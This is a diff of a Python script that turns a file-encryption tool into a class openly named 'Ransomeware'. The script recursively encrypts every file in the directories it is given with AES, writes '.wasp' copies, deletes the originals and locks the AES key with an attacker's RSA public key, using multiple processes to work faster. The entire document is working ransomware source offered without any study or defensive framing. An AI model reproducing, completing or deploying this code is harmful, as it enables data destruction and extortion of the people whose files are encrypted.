@@ -1,108 +1,99 @@
-from Crypto.PublicKey import RSA
+from os import walk, path, remove
 from Crypto.Cipher import AES, PKCS1_OAEP
-from cryptography.fernet import Fernet
-import os
-import sys
-
-class Protecter:
+from Crypto.Random import get_random_bytes
+from Crypto.PublicKey import RSA
+from collections import deque
+from multiprocessing import cpu_count, Pool, freeze_support
+import argparse
+ 
+class Ransomeware:
     def __init__(self):
-        self.aes_key = None
-        self.cryptor = None
-        self.filelist = []
-        self.directories = []
-        for i in range(1,len(sys.argv)):
-            self.directories.append(sys.argv[i])
+        self.aeskey = get_random_bytes(16)
+        self.files = deque()
+        self.directories = None
 
-    def generate_aes_key(self):
-        self.aes_key =  Fernet.generate_key()
-        #pint key as precaution
-        print(self.aes_key)
-        self.cryptor = Fernet(self.aes_key)
-
-    def rsa_encryption(self):
-        with open("public.pem", 'rb') as rsa_pub_key:
-            public_key = RSA.importKey(rsa_pub_key.read())
-            public_cryptor =  PKCS1_OAEP.new(public_key)
-            encrypted_aes_key = public_cryptor.encrypt(self.aes_key)
-        with open ("encrypted_aes_key.txt", 'wb') as aesout:
-            aesout.write(encrypted_aes_key)
+    def rsa_ecrypt(self,InputKey,OutputKey):
+        with open(InputKey, 'rb') as rsa_pub_key:
+            key = RSA.importKey(rsa_pub_key.read())
+        public_cryptor =  PKCS1_OAEP.new(key)
+        encrypted_aes_key = public_cryptor.encrypt(self.aeskey)
+        if OutputKey:
+            with open(OutputKey, "wb") as ecaes:
+                ecaes.write(encrypted_aes_key)
+        else:
+            with open("key.bin", "wb") as ecaes:
+                ecaes.write(encrypted_aes_key)
         public_cryptor = None
-    
-    def getfile(self):
-        for path in self.directories:
-            for root, dirs, files in os.walk(path):
+
+    def get_files(self):
+        for one in self.directories:
+            for root, dirs, files in walk(one):
                 for file in files:
-                    #loggin all files in a list
-                    self.filelist.append(os.path.join(root,file))
+                    self.files.append(path.join(root,file))
 
-    def encrypt(self):
-        for file in self.filelist:
-            try:
-                if os.path.exists(file):
-                    #read data from file
-                    with open(file, 'rb') as datain:
-                        data = datain.read()
-                        encrypted_data = self.cryptor.encrypt(data)
-                    with open(f"{file}.wasp", "wb") as wasp:
-                        #encrypt the data
-                        wasp.write(encrypted_data)
-                    with open("encrypted_files.log", 'a+', encoding="utf8") as log:
-                        log.write(f"{file}\n")
-                    #remove clear text file
-                    os.remove(file)
-            #log unencrypted files with exception
-            except Exception as e:
-                with open("failed_encryption.log", 'a+', encoding="utf8") as fail:
-                    fail.write(f"{file} {str(e)}\n")
-                    continue
+    def encrypt(self,file):
+        with open(file, "rb") as d:
+            iv = get_random_bytes(16)
+            cipher = AES.new(self.aeskey, AES.MODE_CBC,iv)
+            yield iv
+            while True:
+                chunk = d.read(1024)
+                if not chunk:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += b"\x00" * (16 - len(chunk) % 16)
+                yield cipher.encrypt(chunk)
 
-    def leavenote(self):
-        #leave a note in the root path
-        mynote ='''
-write something here.notes or anything you want to log beside the encrypted file.
-you still can read this note after the script excution.
-saved under every folder in argument list.
+    def out_data(self,file,out):
+        with open(f"{file}.wasp", "wb") as o:
+            while True:
+                try:
+                    o.write(next(out))
+                except StopIteration:
+                    break
+            
+    def test(self,file):
+        enc = self.encrypt(file)
+        self.out_data(file,enc)
+        remove(file)
 
-'''
-        for folder in self.directories:
-            with open(f'{folder}/encryption_read_me.txt', 'w', encoding="utf8") as f:
-                f.write(mynote)
-
-    def clear(self):
-        #clear memory
-        self.aes_key = None
-        self.cryptor = None
-        self.filelist = []
-        self.directories = []
-
+    def worker(self):
+        while self.files:
+            file = self.files.pop()
+            yield file
 
 def main():
-    run = Protecter()
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-k','--key', help='RSA public key', required=True)
+    parser.add_argument('-d','--dir', nargs='+', help='Directories to encrypt', required=True)
+    parser.add_argument('-o','--out', help='output encrypted aes key', required=False)
+    args = parser.parse_args()
+    run = Ransomeware()
+    run.directories = args.dir
     print("__START ENCRYPTION__")
-    print("[+] generating aes key")
-    run.generate_aes_key()
-    print("[+] done.")
     print("[+] getting all files and directories")
-    run.getfile()
+    run.get_files()
     print("[+] done")
-    print("[+] encrypting aes key with rsa pub key")
-    run.rsa_encryption()
+    print("[+] encrypting aes key with rsa public key")
+    run.rsa_ecrypt(args.key,args.out)
     print("[+] done.")
-    print("[+] encryption start.")
-    run.encrypt()
-    print("[+] encryption end.")
-    print("[+] leaving notes.")
-    run.leavenote()
-    print("[+] done.")
-    print("[+] clearing memoring from keys")
-    run.clear()
+    print("[+] Multiprocess encryption start.")
+    ok = run.worker()
+    cpu = cpu_count()
+    while True:
+        try:
+            with Pool(processes=cpu) as pool:
+                pool.apply_async(run.test(next(ok)))
+        except Exception as e:
+            error = repr(e)
+            if error == "StopIteration()":
+                break
+            else:
+                print(error)
+                continue
+    print("[+] Multiprocess encryption end.")
     print("__END ENCRYPTION__")
 
-
-if len(sys.argv) < 2:
-    sys.exit(f"usage: {sys.argv[0]} folder1 folder2 folder3...")
-try:
+if __name__ == '__main__':
+    freeze_support()
     main()
-except Exception as E:
-    print("[-] fix the following error:\n" + str(E))
-    
